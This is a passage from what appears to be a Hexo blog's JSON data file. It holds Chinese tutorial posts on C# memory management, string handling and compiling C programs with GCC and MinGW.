\"1234\";\na += \"5678\";\nConsole.ReadLine();\n```\n\n看起来我们似乎已经把a的值从“1234”改为了“12345678”，实际上并没有改变。因为string的值是无法修改不了了。堆中其实存在着两个字符串对象。字符串“1234”仍然在内存中驻留。\n\nstring容易引起内存驻留，但我们仍有办法减少内存使用。\n\n``` CSharp\nstring str1 = \"ABCD1234\";\nstring str2 = \"ABCD1234\";\nstring str3 = \"ABCD\" + \"1234\"; \nstring str4 = \"1234\";\nstring str5 = \"ABCD\" + str4;\nobject.ReferenceEquals(str1, str2) == True；\nobject.ReferenceEquals(str1, str3) == True；\nobject.ReferenceEquals(str1, str5) == False\n```\n通过上面比较，字符串都驻留在内存。尽量使用字符串相加来代替字符串变量和字符创相加，这样可以使用重复利用字符串驻留，减少内存使用。\n\n``` CSharp\nstring str3 = \"ABCD\" + \"1234\"; \n```\n\n对string作频繁的操作使用StringBuilder或string.format(也是StringBuilder实现)处理。\nStringBuilder内部维护一个字符数组，而不是一个string来避免string操作带来的新的string的创建。\n\n``` CSharp\nStringBuilder sb = new StringBuilder();\nsb.Append(str1);\nsb.Append(str2);\nsb.Append(str3);\n``` \n\n``` CSharp\nstring sb = string.format(\"{0}{1}{2}\",str1,str2,str3);\n``` \n\n相当于sb = str1 + str2 + str3;\n\n4.高效地进行string的比较操作\n对象之间的比较有比较Value和比较Reference之说。一般地对Reference进行比较的速度最快，因为只需要比较一下是不是同一地址就行了。\nobject.ReferenceEquals和string. Compare就是引用比较的方法。","slug":"CSharp-1","published":1,"updated":"2016-06-15T15:52:46.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cisw0llsk0002g2x6hp2ww3xf","content":"<p>.net不必手工管理内存，但要编写高性能的代码，就仍需理解后面发生的事情。</p>\n<h2 id=\"内存模型-堆与栈\"><a href=\"#内存模型-堆与栈\" class=\"headerlink\" title=\"内存模型:堆与栈\"></a>内存模型:堆与栈</h2><p>C#内存主要有两类：Stack和Heap<br>Stack叫做栈区，由编译器自动分配释放，存放函数的参数值，局部变量的值等。<br>Heap则称之为堆区，由开发人员申请内存，在垃圾回收器的控制下工作。<br><img src=\"/img/CSharp-1.jpg\" alt=\"效果\"></p>\n<a id=\"more\"></a>\n<h2 id=\"值类型与引用类型\"><a href=\"#值类型与引用类型\" class=\"headerlink\" title=\"值类型与引用类型\"></a>值类型与引用类型</h2><p>值类型的数据和内存在同一个位置，而引用类型是一个指向内存的指针。也就是对Stack和Heap的实际使用。<br><img src=\"/img/CSharp-2.jpg\" alt=\"效果\"><br><img src=\"/img/CSharp-3.jpg\" alt=\"效果\"><br>除了Object和String,其它都是值类型。值类型的性能要略优于引用类型，它只需要一次访问内存就可拿到数据。</p>\n<h2 id=\"装箱与拆箱\"><a href=\"#装箱与拆箱\" class=\"headerlink\" title=\"装箱与拆箱\"></a>装箱与拆箱</h2><p>值类型与引用类型进行类型转换时会产生装箱和拆箱操作。<br><img src=\"/img/CSharp-4.jpg\" alt=\"效果\"><br>非必要时尽量避免这类操作，会对性能一定的影响。</p>\n<h2 id=\"垃圾回收器GC\"><a href=\"#垃圾回收器GC\" class=\"headerlink\" title=\"垃圾回收器GC\"></a>垃圾回收器GC</h2><p>垃圾回收器为什么不会立即回收对象?<br>对象不再被引用时,如果立即删除,堆上的自由空间就会分散开来，给新对象分配内存就会很难处理,程序必须搜索整个堆才能找到一块足够大的内存块来存储整个新对象。<br>整个heap中对象的引用关系错综复杂（交叉引用、循环引用），形成复杂的graph。heap对应有一个Roots，它能使程序在heap之外可以找到的各种入口点。root包括:全局对象、静态变量、局部对象、函数调用参数、当前CPU寄存器中的对象指针。<br>下面可以通过一组图片来进一步了解GC的工作。黄色代表还在引用的对象，灰色代表没有引用的对象。<br>现在内存使用已达到阀值,GC需要清理内存，下图就是GC整个清理的过程。<br><img src=\"/img/CSharp-5.gif\" alt=\"效果\"><br><img src=\"/img/CSharp-6.gif\" alt=\"效果\"><br><img src=\"/img/CSharp-7.gif\" alt=\"效果\"><br><img src=\"/img/CSharp-8.gif\" alt=\"效果\"><br>GC回收内存是一种非常耗费性能的工作，减少不必要的内存使用有助于提高GC性能</p>\n<h2 id=\"传参的优化\"><a href=\"#传参的优化\" class=\"headerlink\" title=\"传参的优化\"></a>传参的优化</h2><p>如果我们要将一个非常大的值类型数据(如数据量大的struct类型)入栈，它会占用非常大的内存空间，而且会占有过多的处理器资源来进行拷贝复制。<br><figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">struct</span> ConstNum</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">long</span> a,b,c,d,e,f,g,h,i,j,k;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span>  <span class=\"keyword\">void</span> <span class=\"title\">Go</span>(<span class=\"params\"></span>)</span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">\tConstNum x = <span class=\"keyword\">new</span> ConstNum();</span><br><span class=\"line\">\tDo(x);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span>  <span class=\"keyword\">void</span> <span class=\"title\">Do</span>(<span class=\"params\">ConstNum x</span>)</span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">//do something</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>可以将struct改为class。实例对象之后则是引用类型。或使用ref关键字将方法改为Do(ref ConstNum x)，也可以达到引用类型的作用。</p>\n<h2 id=\"静态\"><a href=\"#静态\" class=\"headerlink\" title=\"静态\"></a>静态</h2><p>有一个Dude类，你需要实例化多个对像使用。<br><figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Class Dude</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">private</span> _name =<span class=\"string\">\"test\"</span>;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">SayHello</span>(<span class=\"params\"></span>)</span><br><span class=\"line\">\t</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">//DoSomething</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><img src=\"/img/CSharp-9.gif\" alt=\"效果\"><br>你可以使用静态方法,以达到内存节省的目的。<br><figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Class Dude</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">private</span> _name =<span class=\"string\">\"test\"</span>;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">SayHello</span>(<span class=\"params\"></span>)</span><br><span class=\"line\">\t</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">//DoSomething</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><img src=\"/img/CSharp-10.gif\" alt=\"效果\"><br>实际项目中使用单例模式来达到省内存的目的。</p>\n<h2 id=\"IDisposable与析构函数\"><a href=\"#IDisposable与析构函数\" class=\"headerlink\" title=\"IDisposable与析构函数\"></a>IDisposable与析构函数</h2><p>托管的资源只能由CG回收。而非托管的资源可以通过实现IDisposable进行释放。<br><figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title\">CDisposable</span> : <span class=\"title\">IDisposable</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"comment\">//析构函数，编译后变成 protected void Finalize()，GC会在回收对象前会调用调用该方法 </span></span><br><span class=\"line\">    ~CDisposable() </span><br><span class=\"line\">    &#123; </span><br><span class=\"line\">        Dispose(<span class=\"literal\">false</span>); </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//通过实现该接口，显式地释放对象，只针对非托管对象。</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">Dispose</span>(<span class=\"params\"></span>) </span><br><span class=\"line\">    </span>&#123; </span><br><span class=\"line\">        Dispose(<span class=\"literal\">true</span>); </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>Dispose调用</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Using(MyClass myObj = <span class=\"keyword\">new</span> CDisposable())</span><br><span class=\"line\">&#123; </span><br><span class=\"line\">\t<span class=\"comment\">//DoSomething</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>或者直接调myObj.Dispose();</p>\n<h2 id=\"字符串的内存规则\"><a href=\"#字符串的内存规则\" class=\"headerlink\" title=\"字符串的内存规则\"></a>字符串的内存规则</h2><p>string是引用类型，但string的值是不可变，但你改变string值的时候会对新值重新分配内存,老值仍驻留在内存中。</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">string</span> a = <span class=\"string\">\"1234\"</span>;</span><br><span class=\"line\">a += <span class=\"string\">\"5678\"</span>;</span><br><span class=\"line\">Console.ReadLine();</span><br></pre></td></tr></table></figure>\n<p>看起来我们似乎已经把a的值从“1234”改为了“12345678”，实际上并没有改变。因为string的值是无法修改不了了。堆中其实存在着两个字符串对象。字符串“1234”仍然在内存中驻留。</p>\n<p>string容易引起内存驻留，但我们仍有办法减少内存使用。</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">string</span> str1 = <span class=\"string\">\"ABCD1234\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">string</span> str2 = <span class=\"string\">\"ABCD1234\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">string</span> str3 = <span class=\"string\">\"ABCD\"</span> + <span class=\"string\">\"1234\"</span>; </span><br><span class=\"line\"><span class=\"keyword\">string</span> str4 = <span class=\"string\">\"1234\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">string</span> str5 = <span class=\"string\">\"ABCD\"</span> + str4;</span><br><span class=\"line\"><span class=\"keyword\">object</span>.ReferenceEquals(str1, str2) == True；</span><br><span class=\"line\"><span class=\"keyword\">object</span>.ReferenceEquals(str1, str3) == True；</span><br><span class=\"line\"><span class=\"keyword\">object</span>.ReferenceEquals(str1, str5) == False</span><br></pre></td></tr></table></figure>\n<p>通过上面比较，字符串都驻留在内存。尽量使用字符串相加来代替字符串变量和字符创相加，这样可以使用重复利用字符串驻留，减少内存使用。</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">string</span> str3 = <span class=\"string\">\"ABCD\"</span> + <span class=\"string\">\"1234\"</span>;</span><br></pre></td></tr></table></figure>\n<p>对string作频繁的操作使用StringBuilder或string.format(也是StringBuilder实现)处理。<br>StringBuilder内部维护一个字符数组，而不是一个string来避免string操作带来的新的string的创建。</p>\n<pre><code class=\"CSharp\">StringBuilder sb = <span class=\"keyword\">new</span> StringBuilder();\nsb.Append(str1);\nsb.Append(str2);\nsb.Append(str3);\n</code></pre>\n<pre><code class=\"CSharp\"><span class=\"keyword\">string</span> sb = <span class=\"keyword\">string</span>.format(<span class=\"string\">\"{0}{1}{2}\"</span>,str1,str2,str3);\n</code></pre>\n<p>相当于sb = str1 + str2 + str3;</p>\n<p>4.高效地进行string的比较操作<br>对象之间的比较有比较Value和比较Reference之说。一般地对Reference进行比较的速度最快，因为只需要比较一下是不是同一地址就行了。<br>object.ReferenceEquals和string. Compare就是引用比较的方法。</p>\n","excerpt":"<p>.net不必手工管理内存，但要编写高性能的代码，就仍需理解后面发生的事情。</p>\n<h2 id=\"内存模型-堆与栈\"><a href=\"#内存模型-堆与栈\" class=\"headerlink\" title=\"内存模型:堆与栈\"></a>内存模型:堆与栈</h2><p>C#内存主要有两类：Stack和Heap<br>Stack叫做栈区，由编译器自动分配释放，存放函数的参数值，局部变量的值等。<br>Heap则称之为堆区，由开发人员申请内存，在垃圾回收器的控制下工作。<br><img src=\"/img/CSharp-1.jpg\" alt=\"效果\"></p>","more":"<h2 id=\"值类型与引用类型\"><a href=\"#值类型与引用类型\" class=\"headerlink\" title=\"值类型与引用类型\"></a>值类型与引用类型</h2><p>值类型的数据和内存在同一个位置，而引用类型是一个指向内存的指针。也就是对Stack和Heap的实际使用。<br><img src=\"/img/CSharp-2.jpg\" alt=\"效果\"><br><img src=\"/img/CSharp-3.jpg\" alt=\"效果\"><br>除了Object和String,其它都是值类型。值类型的性能要略优于引用类型，它只需要一次访问内存就可拿到数据。</p>\n<h2 id=\"装箱与拆箱\"><a href=\"#装箱与拆箱\" class=\"headerlink\" title=\"装箱与拆箱\"></a>装箱与拆箱</h2><p>值类型与引用类型进行类型转换时会产生装箱和拆箱操作。<br><img src=\"/img/CSharp-4.jpg\" alt=\"效果\"><br>非必要时尽量避免这类操作，会对性能一定的影响。</p>\n<h2 id=\"垃圾回收器GC\"><a href=\"#垃圾回收器GC\" class=\"headerlink\" title=\"垃圾回收器GC\"></a>垃圾回收器GC</h2><p>垃圾回收器为什么不会立即回收对象?<br>对象不再被引用时,如果立即删除,堆上的自由空间就会分散开来，给新对象分配内存就会很难处理,程序必须搜索整个堆才能找到一块足够大的内存块来存储整个新对象。<br>整个heap中对象的引用关系错综复杂（交叉引用、循环引用），形成复杂的graph。heap对应有一个Roots，它能使程序在heap之外可以找到的各种入口点。root包括:全局对象、静态变量、局部对象、函数调用参数、当前CPU寄存器中的对象指针。<br>下面可以通过一组图片来进一步了解GC的工作。黄色代表还在引用的对象，灰色代表没有引用的对象。<br>现在内存使用已达到阀值,GC需要清理内存，下图就是GC整个清理的过程。<br><img src=\"/img/CSharp-5.gif\" alt=\"效果\"><br><img src=\"/img/CSharp-6.gif\" alt=\"效果\"><br><img src=\"/img/CSharp-7.gif\" alt=\"效果\"><br><img src=\"/img/CSharp-8.gif\" alt=\"效果\"><br>GC回收内存是一种非常耗费性能的工作，减少不必要的内存使用有助于提高GC性能</p>\n<h2 id=\"传参的优化\"><a href=\"#传参的优化\" class=\"headerlink\" title=\"传参的优化\"></a>传参的优化</h2><p>如果我们要将一个非常大的值类型数据(如数据量大的struct类型)入栈，它会占用非常大的内存空间，而且会占有过多的处理器资源来进行拷贝复制。<br><figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">struct</span> ConstNum</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">long</span> a,b,c,d,e,f,g,h,i,j,k;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span>  <span class=\"keyword\">void</span> <span class=\"title\">Go</span>(<span class=\"params\"></span>)</span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">\tConstNum x = <span class=\"keyword\">new</span> ConstNum();</span><br><span class=\"line\">\tDo(x);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span>  <span class=\"keyword\">void</span> <span class=\"title\">Do</span>(<span class=\"params\">ConstNum x</span>)</span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">//do something</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>可以将struct改为class。实例对象之后则是引用类型。或使用ref关键字将方法改为Do(ref ConstNum x)，也可以达到引用类型的作用。</p>\n<h2 id=\"静态\"><a href=\"#静态\" class=\"headerlink\" title=\"静态\"></a>静态</h2><p>有一个Dude类，你需要实例化多个对像使用。<br><figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Class Dude</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">private</span> _name =<span class=\"string\">\"test\"</span>;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">SayHello</span>(<span class=\"params\"></span>)</span><br><span class=\"line\">\t</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">//DoSomething</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><img src=\"/img/CSharp-9.gif\" alt=\"效果\"><br>你可以使用静态方法,以达到内存节省的目的。<br><figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Class Dude</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">private</span> _name =<span class=\"string\">\"test\"</span>;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">SayHello</span>(<span class=\"params\"></span>)</span><br><span class=\"line\">\t</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">//DoSomething</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><img src=\"/img/CSharp-10.gif\" alt=\"效果\"><br>实际项目中使用单例模式来达到省内存的目的。</p>\n<h2 id=\"IDisposable与析构函数\"><a href=\"#IDisposable与析构函数\" class=\"headerlink\" title=\"IDisposable与析构函数\"></a>IDisposable与析构函数</h2><p>托管的资源只能由CG回收。而非托管的资源可以通过实现IDisposable进行释放。<br><figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title\">CDisposable</span> : <span class=\"title\">IDisposable</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"comment\">//析构函数，编译后变成 protected void Finalize()，GC会在回收对象前会调用调用该方法 </span></span><br><span class=\"line\">    ~CDisposable() </span><br><span class=\"line\">    &#123; </span><br><span class=\"line\">        Dispose(<span class=\"literal\">false</span>); </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//通过实现该接口，显式地释放对象，只针对非托管对象。</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">Dispose</span>(<span class=\"params\"></span>) </span><br><span class=\"line\">    </span>&#123; </span><br><span class=\"line\">        Dispose(<span class=\"literal\">true</span>); </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>Dispose调用</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Using(MyClass myObj = <span class=\"keyword\">new</span> CDisposable())</span><br><span class=\"line\">&#123; </span><br><span class=\"line\">\t<span class=\"comment\">//DoSomething</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>或者直接调myObj.Dispose();</p>\n<h2 id=\"字符串的内存规则\"><a href=\"#字符串的内存规则\" class=\"headerlink\" title=\"字符串的内存规则\"></a>字符串的内存规则</h2><p>string是引用类型，但string的值是不可变，但你改变string值的时候会对新值重新分配内存,老值仍驻留在内存中。</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">string</span> a = <span class=\"string\">\"1234\"</span>;</span><br><span class=\"line\">a += <span class=\"string\">\"5678\"</span>;</span><br><span class=\"line\">Console.ReadLine();</span><br></pre></td></tr></table></figure>\n<p>看起来我们似乎已经把a的值从“1234”改为了“12345678”，实际上并没有改变。因为string的值是无法修改不了了。堆中其实存在着两个字符串对象。字符串“1234”仍然在内存中驻留。</p>\n<p>string容易引起内存驻留，但我们仍有办法减少内存使用。</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">string</span> str1 = <span class=\"string\">\"ABCD1234\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">string</span> str2 = <span class=\"string\">\"ABCD1234\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">string</span> str3 = <span class=\"string\">\"ABCD\"</span> + <span class=\"string\">\"1234\"</span>; </span><br><span class=\"line\"><span class=\"keyword\">string</span> str4 = <span class=\"string\">\"1234\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">string</span> str5 = <span class=\"string\">\"ABCD\"</span> + str4;</span><br><span class=\"line\"><span class=\"keyword\">object</span>.ReferenceEquals(str1, str2) == True；</span><br><span class=\"line\"><span class=\"keyword\">object</span>.ReferenceEquals(str1, str3) == True；</span><br><span class=\"line\"><span class=\"keyword\">object</span>.ReferenceEquals(str1, str5) == False</span><br></pre></td></tr></table></figure>\n<p>通过上面比较，字符串都驻留在内存。尽量使用字符串相加来代替字符串变量和字符创相加，这样可以使用重复利用字符串驻留，减少内存使用。</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">string</span> str3 = <span class=\"string\">\"ABCD\"</span> + <span class=\"string\">\"1234\"</span>;</span><br></pre></td></tr></table></figure>\n<p>对string作频繁的操作使用StringBuilder或string.format(也是StringBuilder实现)处理。<br>StringBuilder内部维护一个字符数组，而不是一个string来避免string操作带来的新的string的创建。</p>\n<pre><code class=\"CSharp\">StringBuilder sb = <span class=\"keyword\">new</span> StringBuilder();\nsb.Append(str1);\nsb.Append(str2);\nsb.Append(str3);\n</code></pre>\n<pre><code class=\"CSharp\"><span class=\"keyword\">string</span> sb = <span class=\"keyword\">string</span>.format(<span class=\"string\">\"{0}{1}{2}\"</span>,str1,str2,str3);\n</code></pre>\n<p>相当于sb = str1 + str2 + str3;</p>\n<p>4.高效地进行string的比较操作<br>对象之间的比较有比较Value和比较Reference之说。一般地对Reference进行比较的速度最快，因为只需要比较一下是不是同一地址就行了。<br>object.ReferenceEquals和string. Compare就是引用比较的方法。</p>"},{"title":"C语言之编译器GCC","date":"2016-03-22T16:00:00.000Z","desc":"gcc","_content":"## 为什么是C\n\n很多牛B的开源项目都是C实现的，如redis,nginx,memcache,node等等。主要原因是C语言比较简单(相对C++来说)，编译器稳定可靠。C如果借鉴一些良好设计,C一样可以写的很好，如果习惯了，开发效率未必会比C++低。那么C怎么编译呢?\n\n## GCC\nGCC(GNU Compiler Collection)，GNU编译器集合,是一套由 GNU 开发的编程语言编译器。其中包括了ANSI C Compiler。在现在遍地都是IDE的时代，很多开发人员都忘了怎么用cli去编译程序。gcc编译过程是分为四个阶段进行的，即预处理(也称预编译,Preprocessing)、编译(Compilation)、汇编(Assembly)和连接(Linking)。\n<!-- more -->\n#### 预处理\n``` bash\ngcc -E test.c -o test.i\n```\n可以输出test.i文件中存放着test.c经预处理之后的代码。打开test.i文件，看一看，就明白了。\n\n#### 编译\n``` bash\ngcc -S test.i -o test.s\n```\n预处理之后，可直接对生成的test.i文件编译，生成汇编代码。\n\n#### 汇编\n``` bash\ngcc -c test.s -o test.o\n```\n汇编器可以将汇编代码编译为目标文件。\n\n#### 连接\n``` bash\ngcc test.o -o test\n```\ngcc连接器是gas提供的，负责将程序的目标文件与所需的所有附加的目标文件连接起来，最终生成可执行文件。附加的目标文件包括静态连接库和动态连接库。\n\n#### 简单编译\n一步到位:\n``` bash\ngcc test.c -o test\n```\n\n#### 多个程序文件的编译\n通常整个程序是由多个源文件组成的，相应地也就形成了多个编译单元，使用GCC能够很好地管理这些编译单元。\n``` bash\ngcc -c test1.c -o test1.o\ngcc -c test2.c -o test2.o\ngcc test1.o test2.o -o test\n```\n\n## MakeFile\n同样IDE的开发人员估计一般都不知道，IDE都为你做了这个工作。一个软件的代码文件是非常多的，如果你要自己一个个去写编译规则是相当复杂的。那么makefile就是解决整个软件的编译规则。一个软件项目中的源文件不计数，其按类型、功能、模块分别放在若干个目录中，makefile定义了一系列的规则来指定，哪些文件需要先编译，哪些文件需要后编译，哪些文件需要重新编译，甚至于进行更复杂的功能操作。makefile带来的好处就是——“自动化编译”，一旦写好，只需要一个make命令，整个工程完全自动编译，极大的提高了效率。\n\n## MinGW\nMinGW是指只用自由软件来生成纯粹的Win32可执行文件的编译环境，它是Minimalist GNU on Windows的略称。\n\n#### 下载MinGW\n到Sourceforge(http://sourceforge.net/project/showfiles.php?group_id=2435)下载一个MinGW.exe。\n\n#### 环境变量的配置\na.在PATH的值中加入“C:\\MinGW\\bin”。这是寻找gcc编译器的路径。如果PATH中还有其他内容，需要用英文状态下分号进行分割\nb.新建LIBRARY_PATH变量，在其值中加入“C:\\MinGW\\lib”。这是标准库存放的路径。\nc.新建C_INCLUDE_PATH变量，在其值中加入“C:\\MinGW\\include”。这是Include查找头文件的路径。\n\n#### 验证gcc是否正常运行\n在cmd控制台窗口下面,输入gcc -v.若已经成功安装好,会显示gcc的版本信息。","source":"_posts/c-1.md","raw":"---\ntitle: C语言之编译器GCC\ndate: 2016-3-23\ndesc: gcc\n---\n## 为什么是C\n\n很多牛B的开源项目都是C实现的，如redis,nginx,memcache,node等等。主要原因是C语言比较简单(相对C++来说)，编译器稳定可靠。C如果借鉴一些良好设计,C一样可以写的很好，如果习惯了，开发效率未必会比C++低。那么C怎么编译呢?\n\n## GCC\nGCC(GNU Compiler Collection)，GNU编译器集合,是一套由 GNU 开发的编程语言编译器。其中包括了ANSI C 